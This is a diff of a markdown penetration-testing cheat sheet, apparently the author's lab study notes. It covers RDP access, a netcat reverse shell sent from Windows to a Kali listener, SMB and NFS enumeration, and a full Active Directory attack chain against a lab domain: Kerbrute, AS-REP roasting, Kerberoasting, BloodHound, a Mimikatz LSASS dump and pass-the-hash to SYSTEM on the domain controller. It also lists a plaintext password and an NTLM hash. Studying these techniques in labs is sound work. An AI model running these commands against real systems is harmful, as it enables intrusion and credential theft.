@@ -70,6 +70,53 @@ When the TCP scan finishes, immediately run a UDP scan.
 sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
 ```
 
+
+#### <span style="color:rgb(11, 142, 224)">SSH into a user</span>
+To SSH into a user using a private key:
+```
+ssh -i <private_key> <username>@<target_ip>
+```
+#### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
+
+BLACK SCREEN : lower mtu to 1000
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
+```
+or
+When it isn't connecting : 
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
+```
+or 
+```
+xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
+```
+Enter the password when prompted.
+
+Transfer `nc.exe` to windows and get a reverse shell : 
+Download 64 bit netcat : 
+if required then download 32 bit x86 netcat
+```
+https://github.com/int0x33/nc.exe/
+```
+start python server : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+```
+powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
+```
+to get shell back from windows to kali : 
+start a listener on Kali:
+```
+rlwrap -f . nc -lvnp 4444
+```
+windows command to get reverse shell of cmd : 
+```
+nc.exe -e cmd.exe <kali ip> 4444
+```
+
 #### <span style="color:rgb(11, 142, 224)">Hash/Password cracking : </span>
 
 Whenever you find a hash, first try [https://crackstation.net/](https://crackstation.net/)
@@ -123,56 +170,10 @@ For common <span style="color:rgb(11, 142, 224)">Kerberoasting</span> hashes (`$
 ```
 john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-or you can use `--format=krb5asrep` as per requirement of hash
+==🔵or you can use `--format=krb5asrep` as per requirement of hash==
 Then show the recovered password:
 ```
 john --show --format=krb5tgs hash.txt
-```
-
-#### <span style="color:rgb(11, 142, 224)">SSH into a user</span>
-To SSH into a user using a private key:
-```
-ssh -i <private_key> <username>@<target_ip>
-```
-#### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
-
-BLACK SCREEN : lower mtu to 1000
-```
-xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
-```
-or
-When it isn't connecting : 
-```
-xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution /sec:rdp
-```
-or 
-```
-xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
-```
-Enter the password when prompted.
-
-Transfer `nc.exe` to windows and get a reverse shell : 
-Download 64 bit netcat : 
-if required then download 32 bit x86 netcat
-```
-https://github.com/int0x33/nc.exe/
-```
-start python server : 
-```
-python3 -m http.server 8000
-```
-download on windows :
-```
-powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
-```
-to get shell back from windows to kali : 
-start a listener on Kali:
-```
-rlwrap -f . nc -lvnp 4444
-```
-windows command to get reverse shell of cmd : 
-```
-nc.exe -e cmd.exe <kali ip> 4444
 ```
 
 #### <span style="color:rgb(11, 142, 224)">Stable Shell : </span>
@@ -181,9 +182,24 @@ And we have a shell as www / $ , Get a tty (stable shell) shell using,
 ```
 python -c "import pty; pty.spawn('/bin/bash')"
 ```
-#### <span style="color:rgb(11, 142, 224)">SMB null guest login</span>
+#### <span style="color:rgb(11, 142, 224)">SMB</span>
 
+Access Anonymous SMB Shares :
+```
+smbclient \\\\<IP>\\anonymous
+```
 
+List SMB Shares :
+```
+smbclient -L \\<IP>
+```
+
+#### <span style="color:rgb(11, 142, 224)">NFS Shares</span>
+
+Show NFS Shares : 
+```
+showmount -e <IP>
+```
 
 #### <span style="color:rgb(11, 142, 224)">FTP anonymous login</span>
 
@@ -240,7 +256,7 @@ Go back to your listener to see if the shell connected back.
 sqlitebrowser ma.db
 ```
 
-#### <span style="color:rgb(11, 142, 224)">Web Application </span>
+## <span style="color:rgb(11, 142, 224)">Web Application </span>
 
 ###### <span style="color:rgb(11, 142, 224)">Enumeration : </span>
 
@@ -4363,17 +4379,164 @@ we have got the as-rep of one user `victim`
 
 ## 1. Initial Foothold → Normal user access : 
 
+Enumerate the Domain Controller
+```
+nmap -A -vv -p- -T5 -sC -Pn <DC IP>
+```
+- **Port 53 (DNS)** — open → confirms this is a DC (DNS running).
+- **Port 88 (Kerberos)** — open → Kerberos authentication is active, enabling ticket-based attacks and enumeration.
+- **Ports 445 & 139 (SMB)** — open.
+- **Port 3389 (RDP)** — open → RDP possible.
+- **Ports 389 & 636 (LDAP/LDAPS)** — 389 unencrypted, 636 encrypted (LDAPS). Further confirms the DC role.
 
+We get the domain FQDN:
+```
+FRIENDS.local
+```
+
+also enumerate using : 
+```
+enum4linux <DC IP>
+```
+we get hostname of DC i.e `FRIENDS-DC` : 
+we get `Domain Name` and `Domain Sid` also : 
+
+we can brute force usernames to find the domain users
+Download Kerbrute
+```
+wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
+
+chmod +x kerbrute_linux_amd64
+```
+Download Seclists > Usernames > xato-net-10-million-usernames.txt
+```
+wget https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt
+```
+run : 
+```
+./kerbrute_linux_amd64 userenum xato-net-10-million-usernames.txt -d friend.local -t 25 --dc <DC IP>
+```
+from kerbrute ,we get a valid username 
+note down all the usernames ans password you are getting in a file
+```
+gedit users.txt
+```
+
+Scan the client machines (in parallel)
+```
+nmap -A -vv -p- -T5 -sC -Pn <Machine1 IP>
+nmap -A -vv -p- -T5 -sC -Pn <Machine2 IP>
+```
+from nmap we get the computer name for machine 1 (.130)
+```
+USERPC2
+```
+RDP is open on one of the machines 
+
+now we do AS-REP roasting 
+AS-REP Roasting happens because some Active Directory accounts have Kerberos pre-authentication disabled.
+```
+impacket-GetNPUsers -dc-ip <DC IP> -usersfile users.txt FRIENDS.local/
+```
+Pre-authentication is disabled for `<username>` we get its hash:
+Copy the full hash (from `$krb5` to the end) into a file:
+crack hash : 
+```
+john --format=krb5asrep tstark_asrep --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 ## 2. Local Privilege Escalation → Local Admin / SYSTEM : 
 
+Map the domain with BloodHound
+Instead of transferring `SharpHound.exe` to Windows and shuffling staging files back and forth, use **`bloodhound-python`** — a remote Python ingestor that authenticates, collects the data itself, and brings it back to Kali.
+```
+https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce
+```
+Install : 
+```
+pipx install bloodhound-ce
+```
+run : 
+```
+bloodhound-ce-python -u 'USERNAME' -p 'PASSWORD' -c All -d 'thm.red' -ns <DC IP>
+```
+It finds the computer names (`USERPC1`, `USERPC2`, `FRIENDS-DC`) and the domain name:
+```
+ls
+```
+It outputs four JSON files — `computers.json`, `domains.json`, `groups.json`, `users.json` — which we upload into the BloodHound GUI (**Upload Data**).
 
+Find all Domain Admins in BloodHound
+Now in in bloodhound analysis , we check which all accounts are keberostable
+```
+under analysis > kerberos interaction > list all kerberoastable account 
+```
+
+`krbtgt` is by default and is present on every domain 
+other one  — a custom service account with an SPN set up
+We have to do kerberoasting for it
+we will click on the user to find its SPN i.e `Service Principal Name`
+```
+impacket-GetUserSPNs -request -dc-ip <DC IP> friends.local/<username of user>
+```
+Enter the user's password when prompted. We get the service account's TGS hash:
+
+now we crack the hash 
+```
+john --format=krb5tgs hello --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 ## 3. Lateral Movement → Access another machine :
 
+we now connect to RDP on machine 2 since its RDP port was open : 
+```
+xfreerdp /v:192.168.29.130 /u:http.server /p:Iloveyou07 /cert:ignore /dynamic-resolution
+```
 
+Check local group membership
+```
+whoami /groups
+```
+
+We are a member of the **Administrators** group! Confirm who else is in it:
+```
+net localgroup Administrators
+```
+Our user (`<current username`) is listed.
+
+Dump LSASS memory with Mimikatz
+now open CMD as admin 
+```
+.\mimikatz.exe
+privelege::debug
+```
+Dump credentials of currently logged-in users:
+```
+sekurlsa::logonPasswords
+```
+
+now we find credentials of user `<USERNAME>` which is in memory , which is logged in 
+We confirm he's a Domain Admin by searching his username in BloodHound:
+we copy the NTLM hash 
+```
+NTLM : 3a2a7de01dfa4cb74a0f3dedcc8c75bd
+```
 
 ## 4. Domain Privilege Escalation → Gain Domain Admin or compromise the Domain Controller : 
+
+Save the copied hash:
+```
+gedit newhash
+```
+Pass the hash against the DC with Impacket's psexec:
+```
+impacket-psexec <Domain admin username>@<DC IP> -hashes :<NTLM hash>
+```
+We get **`nt authority\system`** on the Domain Controller.
+
+
+
+
 
 
 
